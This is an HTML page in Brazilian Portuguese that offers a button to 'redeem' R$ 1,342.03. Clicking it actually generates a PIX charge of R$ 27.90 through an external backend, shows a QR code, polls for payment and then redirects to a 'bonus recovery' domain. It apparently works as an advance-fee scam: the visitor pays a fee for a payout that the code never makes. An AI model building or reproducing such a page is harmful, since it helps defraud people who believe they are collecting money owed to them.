<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">

<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }

.button-container {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    padding: 20px;
}

.btn-resgatar {
    background: #FF5F2C;
    color: white;
    border: none;
    width: 100%;
    max-width: 380px;
    padding: 25px 20px;
    font-size: 22px;
    font-weight: 900;
    text-transform: uppercase;
    border-radius: 12px;
    cursor: pointer;
    box-shadow: 0 8px 0 #d1491f, 0 15px 20px rgba(0,0,0,0.2);
    transition: 0.2s;
}

.btn-resgatar:hover {
    transform: translateY(-2px);
}

.btn-resgatar:disabled {
    background: #ccc;
    box-shadow: none;
    cursor: wait;
}

.overlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9998;
}

.modal-pix {
    display: none;
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%) scale(0.9);
    background: white;
    padding: 30px;
    border-radius: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
    z-index: 9999;
    text-align: center;
    width: 90%;
    max-width: 400px;
    transition: 0.2s ease;
}

.modal-pix.active {
    transform: translate(-50%, -50%) scale(1);
}

.btn-copiar {
    background: #28a745;
    color: white;
    border: none;
    padding: 15px;
    width: 100%;
    border-radius: 50px;
    font-weight: 700;
    font-size: 16px;
    margin-top: 15px;
    cursor: pointer;
    transition: 0.2s;
}

.btn-copiar:hover {
    opacity: 0.9;
}
</style>
</head>

<body>

<div class="button-container">
    <button id="btn_pagar" class="btn-resgatar" onclick="gerarPix()">
        RESGATAR R$ 1.342,03
    </button>
</div>

<div class="overlay" id="overlay" onclick="fecharModal()"></div>

<div class="modal-pix" id="modal_pix">
    <h3>QR CODE GERADO</h3>
    <p style="font-size:13px;">Finalize o pagamento para continuar.</p>

    <div id="qr_code_div" style="margin-top:15px;"></div>

    <textarea id="txt_codigo"
        style="width:100%; height:60px; margin-top:10px; font-size:12px;"
        readonly></textarea>

    <button class="btn-copiar" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script>

let intervaloVerificacao = null;

function gerarPix() {

    const btn = document.getElementById("btn_pagar");
    btn.innerHTML = "PROCESSANDO...";
    btn.disabled = true;

    fetch("https://checkout-pix-profissional.onrender.com/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            valor: "27.90",
            name: "Cliente",
            email: "cliente@email.com",
            phone: "11999999999",
            cpf: "00000000000"
        })
    })
    .then(res => res.json())
    .then(data => {

        if (data.success) {

            abrirModal();

            document.getElementById("txt_codigo").value = data.payload;

            const qrDiv = document.getElementById("qr_code_div");
            qrDiv.innerHTML = "";

            new QRCode(qrDiv, {
                text: data.payload,
                width: 200,
                height: 200
            });

            intervaloVerificacao = setInterval(() => {

                fetch("https://checkout-pix-profissional.onrender.com/status?id=" + data.id)
                .then(res => res.json())
                .then(statusData => {

                    if (statusData.status === "approved") {
                        clearInterval(intervaloVerificacao);
                        window.location.href = "https://recuperabonushopp.com/elementor-1064";
                    }

                });

            }, 5000);

        } else {
            erroBotao();
        }

    })
    .catch(() => erroBotao());
}

function abrirModal() {
    document.getElementById("overlay").style.display = "block";
    const modal = document.getElementById("modal_pix");
    modal.style.display = "block";
    setTimeout(() => modal.classList.add("active"), 10);
}

function fecharModal() {
    document.getElementById("overlay").style.display = "none";
    const modal = document.getElementById("modal_pix");
    modal.style.display = "none";
    modal.classList.remove("active");

    if (intervaloVerificacao) {
        clearInterval(intervaloVerificacao);
    }

    resetarBotao();
}

function copiarCodigo() {
    const copyText = document.getElementById("txt_codigo");
    navigator.clipboard.writeText(copyText.value);

    const btn = document.querySelector(".btn-copiar");
    btn.innerHTML = "✔ COPIADO!";
    setTimeout(() => btn.innerHTML = "COPIAR CÓDIGO PIX", 2000);
}

function erroBotao() {
    alert("Erro ao gerar PIX.");
    resetarBotao();
}

function resetarBotao() {
    const btn = document.getElementById("btn_pagar");
    btn.innerHTML = "RESGATAR R$ 1.342,03";
    btn.disabled = false;
}

</script>

</body>
</html>
